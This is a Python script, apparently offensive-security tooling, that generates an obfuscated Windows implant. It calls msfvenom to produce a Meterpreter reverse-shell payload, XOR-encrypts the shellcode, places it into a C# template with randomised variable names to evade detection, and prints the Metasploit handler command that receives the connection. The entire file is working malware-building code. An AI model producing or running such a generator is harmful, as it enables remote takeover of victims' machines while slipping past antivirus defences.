#!/usr/bin/env python3
import subprocess
import random
import re
import sys
import os
import string

output_name = str(r'Program.cs')

if len(sys.argv) < 4:
    print("Usage: python3 generate.py <LHOST> <LPORT> <PAYLOAD> <NAME_IMPLANT>")
    print("Example: python3 generate.py 192.168.45.152 4444 windows/x64/meterpreter/reverse_https implant.exe")
    sys.exit(1)
    
lhost = sys.argv[1]
lport = sys.argv[2]
payload = sys.argv[3]
name_implant = sys.argv[4]

def generate(lhost, lport, payload):
    KEY = random.randbytes(8)
    
    cmd = f'msfvenom -p {payload} LHOST={lhost} LPORT={lport} EXITFUNC=thread -f csharp -o shell'
    subprocess.run(cmd, shell=True)
    
    with open('shell', 'r') as f:
        b = bytes([int(x, 16) for x in re.findall(r'0x[0-9a-f]{2}', f.read())])
    
    os.unlink('shell')
    
    enc = bytes([b[i] ^ KEY[i % len(KEY)] for i in range(len(b))])

    with open('payload.txt', 'r') as file:
        template = file.read()
    
    template = template.replace('<payload1>', enc.hex())
    template = template.replace('<payload2>', KEY.hex())
    
    with open(output_name, 'w') as file:
        file.write(template)

    print(f'msfconsole -q -x "use exploit/multi/handler; set payload {payload}; set LHOST {lhost}; set LPORT {lport}; set AutoRunScript migrate -f; exploit -j"')


generate(lhost, lport, payload)


with open(output_name, 'r') as file:
    content = file.read()

variable_names = [
    '<variable0>', '<variable1>', '<variable2>', '<variable3>', 
    '<variable4>', '<variable5>', '<variable6>', '<variable7>',
    '<variable8>', '<variable9>', '<variable10>', '<variable11>'
]


for variable_name in variable_names:
    length = random.randint(25, 54)
    string_generate = ''.join(random.choices(string.ascii_letters, k=length))
    content = content.replace(variable_name, string_generate)


content = content.replace('<implant.exe>', name_implant)


with open(output_name, 'w') as file:
    file.write(content)

print(f'Name Implant: {name_implant}')
print(f'OBF code CSharp: {output_name}')